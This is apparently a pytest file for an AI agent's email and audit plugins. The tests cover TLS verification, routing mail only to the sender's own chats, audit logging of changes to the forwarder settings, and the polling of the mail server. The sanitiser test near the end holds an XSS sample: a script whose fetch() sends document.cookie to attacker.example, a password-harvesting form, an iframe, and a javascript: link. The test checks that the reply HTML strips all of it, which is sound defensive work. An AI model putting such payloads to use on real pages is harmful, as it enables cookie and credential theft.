"""The inbox handlers: verified TLS, and a mail reaches only its sender's chats."""

from __future__ import annotations

import asyncio
import ssl
from types import SimpleNamespace

from plugins._email_integration.helpers import handler, smtp_client


def test_smtp_verifies_the_server(monkeypatch):
    """smtplib without a context checks neither certificate nor host name."""
    seen = []

    class FakeSMTP:
        def __init__(self, *args, **kwargs):
            seen.append(kwargs.get("context"))

        def __enter__(self):
            return self

        def __exit__(self, *exc):
            return False

        def ehlo(self):
            pass

        def starttls(self, context=None):
            seen.append(context)

        def login(self, *args):
            pass

    monkeypatch.setattr(smtp_client.smtplib, "SMTP", FakeSMTP)
    monkeypatch.setattr(smtp_client.smtplib, "SMTP_SSL", FakeSMTP)
    for use_tls in (True, False):
        config = smtp_client.SmtpConfig(
            server="mail.example.invalid", port=587, username="u", password="p", use_tls=use_tls
        )
        assert asyncio.run(smtp_client.test_smtp(config)) is None

    contexts = [context for context in seen if context is not None]
    assert len(contexts) == 2
    assert all(c.verify_mode == ssl.CERT_REQUIRED and c.check_hostname for c in contexts)


def test_the_dispatcher_cannot_route_a_mail_into_someone_elses_conversation(monkeypatch):
    """The context id is a model's answer to a mail body."""
    routed, started = [], []

    async def decide(*args):
        return SimpleNamespace(action="continue_chat", context_id="theirs", reason="")

    async def no_control(*args):
        return False

    async def route(agent, cfg, msg, context_id):
        routed.append(context_id)

    async def start(*args):
        started.append(True)

    monkeypatch.setattr(handler, "_find_handler_chats", lambda name, sender: [{"context_id": "mine", "thread_id": "t"}])
    monkeypatch.setattr(handler, "_handle_control_email", no_control)
    monkeypatch.setattr(handler, "_call_dispatcher", decide)
    monkeypatch.setattr(handler, "_route_to_chat", route)
    monkeypatch.setattr(handler, "_start_new_chat", start)
    monkeypatch.setattr(handler.AgentContext, "get", staticmethod(lambda ctxid: object()))

    msg = SimpleNamespace(subject="hello", sender="someone@example.invalid")
    asyncio.run(handler._dispatch_message(None, {"name": "default"}, msg))

    assert routed == [] and started == [True]


def test_changing_where_the_audit_trail_goes_is_itself_recorded(monkeypatch):
    """Redirecting or switching off the forwarder used to leave no event."""
    import threading

    from flask import Flask

    from plugins._audit.helpers import audit
    from plugins._ea_siem_forward.api import siem_forward_config as api

    events = []
    monkeypatch.setattr(audit, "emit", lambda event, **fields: events.append((event, fields)))
    monkeypatch.setattr(api.plugin_helpers, "save_plugin_config", lambda *a, **kw: events.append(("saved", {})))
    monkeypatch.setattr(api.config, "get_config", lambda: {"enabled": True, "host": "siem"})
    monkeypatch.setattr(api.config, "is_enabled", lambda: False)
    monkeypatch.setattr(api.sender, "stats", lambda: {"dropped": 3})
    monkeypatch.setattr(api.sender, "reset_stats", lambda: None)

    handler = api.SiemForwardConfig(Flask("test_siem_audit"), threading.Lock())
    asyncio.run(handler.process({"action": "save", "config": {"host": "elsewhere", "enabled": False}}, None))
    asyncio.run(handler.process({"action": "reset_stats"}, None))

    assert events[0] == ("siem_forward.config.update", {"changed_keys": ["enabled", "host"]})
    assert events[1][0] == "saved"
    assert events[2] == ("siem_forward.stats.reset", {"dropped": {"dropped": 3}})


def test_an_exchange_mail_is_handed_to_the_agent_once(tmp_path):
    """The IMAP path marks a mail read as it takes it and remembers how far it got. The Exchange path did neither:
    it asked for everything unread at every poll, so one unread mail was dispatched, and answered, every time."""
    from plugins._email_integration.helpers import imap_client

    class Mail(SimpleNamespace):
        def save(self, update_fields=None):
            self.saved = update_fields

    mailbox = [
        Mail(sender=SimpleNamespace(email_address="asha@example.com"), subject="Port down", text_body="Gi0/1 is down",
             body="Gi0/1 is down", attachments=[], message_id="<1@example.com>", in_reply_to="", is_read=False),
        Mail(sender=SimpleNamespace(email_address="stranger@elsewhere.example"), subject="Hello", text_body="hi",
             body="hi", attachments=[], message_id="<2@elsewhere.example>", in_reply_to="", is_read=False),
    ]
    inbox = SimpleNamespace(filter=lambda q: [m for m in mailbox if not m.is_read])  # what the server answers
    account = SimpleNamespace(inbox=inbox, default_timezone=None)

    def poll():
        return asyncio.run(imap_client.fetch_unread_exchange(account, str(tmp_path), ["*@example.com"]))

    assert [m.subject for m in poll()] == ["Port down"]
    assert poll() == [], "the same mail came back at the next poll"
    assert all(m.is_read and m.saved == ["is_read"] for m in mailbox), "a refused sender's mail is not asked for again either"


def test_mail_beyond_the_cap_of_one_poll_is_read_at_the_next_and_not_skipped_for_good(tmp_path, monkeypatch):
    """Fifteen new mails and a cap of ten: the ten newest were read and the position moved past all fifteen, so the
    five oldest were never read by anything. The oldest are taken first now and the position stops where it read."""
    from plugins._email_integration.helpers import imap_client

    waiting = list(range(101, 116))
    client = SimpleNamespace(select_folder=lambda name: None, gmail_search=lambda q: list(waiting))
    read: list[int] = []

    async def fetch_single(client, msg_id, folder, whitelist):
        read.append(msg_id)
        return None

    monkeypatch.setattr(imap_client, "_fetch_single", fetch_single)
    _, position = asyncio.run(imap_client.fetch_new(client, str(tmp_path), last_uid=100, max_messages=10))
    assert read == list(range(101, 111)) and position == 110
    _, position = asyncio.run(imap_client.fetch_new(client, str(tmp_path), last_uid=position, max_messages=10))
    assert read == list(range(101, 116)) and position == 115


def test_switching_a_plugin_off_or_changing_its_settings_through_the_plugin_endpoint_is_recorded(monkeypatch):
    """The audit forwarder's own endpoint records a change of where the trail goes. The general plugin endpoint
    reaches the same settings (and its on/off switch) and recorded nothing, so the trail could be redirected or
    stopped with no line saying who did it. Names of settings are recorded, never their values."""
    import threading

    from flask import Flask

    from api import plugins as api
    from plugins._audit.helpers import audit

    events = []
    monkeypatch.setattr(audit, "emit", lambda event, **fields: events.append((event, fields)))
    monkeypatch.setattr(api.plugins, "toggle_plugin", lambda *a, **kw: None)
    monkeypatch.setattr(api.plugins, "save_plugin_config", lambda *a, **kw: None)
    handler = api.Plugins(Flask("test_plugins_audit"), threading.Lock())

    asyncio.run(handler.process({"action": "toggle_plugin", "plugin_name": "_ea_siem_forward", "enabled": False}, None))
    asyncio.run(handler.process(
        {"action": "save_config", "plugin_name": "_ea_siem_forward", "settings": {"host": "elsewhere", "token": "s3cret"}}, None))
    asyncio.run(handler.process({"action": "get_config", "plugin_name": "_ea_siem_forward"}, None))  # a read is not an event

    assert events == [
        ("plugin.toggle_plugin", {"plugin": "_ea_siem_forward", "project": "", "profile": "", "enabled": False}),
        ("plugin.save_config", {"plugin": "_ea_siem_forward", "project": "", "profile": "", "changed_keys": ["host", "token"]}),
    ]


def test_a_reply_carries_no_script_form_or_frame_of_the_senders_choosing():
    """The HTML part is the model's text through Markdown, which passes raw HTML through, and the model wrote it
    after reading a mail from outside."""
    from plugins._email_integration.helpers.smtp_client import reply_html

    html = reply_html(
        "Done, **as asked**.\n\n> the quoted line\n\n```\nif a < b && c > d:\n```\n\n"
        '<script>fetch("https://attacker.example/" + document.cookie)</script>'
        '<form action="https://attacker.example"><input name="password"></form>'
        '<iframe src="https://attacker.example"></iframe><a href="javascript:alert(1)" onclick="alert(2)">here</a>'
    )
    for gone in ("<script", "<form", "<input", "<iframe", "javascript:", "onclick", "attacker.example"):
        assert gone not in html, gone
    assert "<strong>as asked</strong>" in html and "<blockquote>" in html
    assert "if a &lt; b &amp;&amp; c &gt; d:" in html, "code keeps its characters"
    assert reply_html("") == ""


def test_a_failed_reply_reaches_the_chat_and_the_agent_without_its_traceback(monkeypatch):
    """The chat shows a plain sentence to a non-admin owner; the agent gets no stack."""
    import importlib

    from helpers import errors

    class BrokenSMTP:
        def __init__(self, *args, **kwargs):
            raise ConnectionRefusedError("[Errno 111] Connection refused")

    monkeypatch.setattr(smtp_client.smtplib, "SMTP", BrokenSMTP)
    config = smtp_client.SmtpConfig(server="mail.example.invalid", port=587, username="u", password="p")
    error = asyncio.run(smtp_client.send_reply(config, "a@example.invalid", "s", "b"))
    assert error.startswith("ConnectionRefusedError")
    assert "Traceback" not in error and "smtp_client.py" not in error

    reply = importlib.import_module(
        "plugins._email_integration.extensions.python.process_chain_end._55_email_reply"
    )
    logged, told = [], []
    context = SimpleNamespace(
        log=SimpleNamespace(log=lambda **entry: logged.append(entry)),
        root_agent=SimpleNamespace(read_prompt=lambda name, **kw: kw["error"]),
        communicate=lambda message: told.append(message),
    )
    monkeypatch.setattr(errors, "details_for", lambda ctx, e: "")
    reply._notify_agent_of_failure(context, "Traceback (most recent call last):\n  File \"/srv/x.py\"", 1)

    assert logged[0]["content"] == errors.user_message(reply.EmailSendError())
    assert "/srv/x.py" not in logged[0]["content"]
    assert logged[0]["kvps"] is None
    assert logged[0]["content"] != errors.PLAIN_FALLBACK
